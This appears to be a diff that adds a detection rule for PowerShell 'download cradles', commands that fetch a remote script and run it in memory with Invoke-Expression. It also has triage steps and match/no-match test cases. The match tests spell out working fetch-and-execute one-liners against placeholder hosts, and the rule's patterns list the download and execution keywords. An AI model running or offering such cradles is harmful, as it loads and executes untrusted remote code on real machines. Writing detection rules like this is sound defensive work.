@@ -1,0 +1,40 @@
+id: DL-0002
+title: PowerShell download cradle that runs what it fetched
+description: >
+  PowerShell downloads content (Net.WebClient, Invoke-WebRequest, Invoke-RestMethod,
+  BITS) and runs it in memory with Invoke-Expression. This is the classic first-stage
+  loader. Downloading alone is common for admins, so the rule needs both halves.
+attack: [T1059.001, T1105]
+tactic: execution
+severity: high
+logsource: process_creation
+detection:
+  selection:
+    process.name: [powershell.exe, pwsh.exe, powershell_ise.exe]
+  download:
+    process.command_line|contains: [downloadstring, downloadfile, downloaddata, net.webclient,
+                                    invoke-webrequest, 'iwr ', invoke-restmethod, 'irm ', start-bitstransfer]
+  execute:
+    process.command_line|re: '(\biex\b|invoke-expression|\|\s*iex)'
+  condition: selection and download and execute
+false_positives:
+  - Installers for developer tools that pipe a script from the vendor (for example some package manager bootstraps).
+triage:
+  - Pull the URL out of the command line and check its reputation and when the domain was registered.
+  - Fetch the payload from an isolated sandbox, not from the endpoint.
+  - Check for files written and connections made right after the event.
+tests:
+  match:
+    - process.name: powershell.exe
+      process.command_line: 'powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.9/a.ps1'')"'
+    - process.name: pwsh.exe
+      process.command_line: 'pwsh -c "iwr https://example.org/s.ps1 -UseBasicParsing | iex"'
+    - process.name: powershell.exe
+      process.command_line: 'powershell Invoke-Expression (Invoke-RestMethod http://198.51.100.7/stage2)'
+  no_match:
+    - process.name: powershell.exe
+      process.command_line: 'powershell Invoke-WebRequest https://example.org/tool.zip -OutFile C:\temp\tool.zip'
+    - process.name: powershell.exe
+      process.command_line: 'powershell Get-ChildItem C:\ -Recurse | Select-Object Name'
+    - process.name: cmd.exe
+      process.command_line: 'cmd /c curl http://example.org | iex'
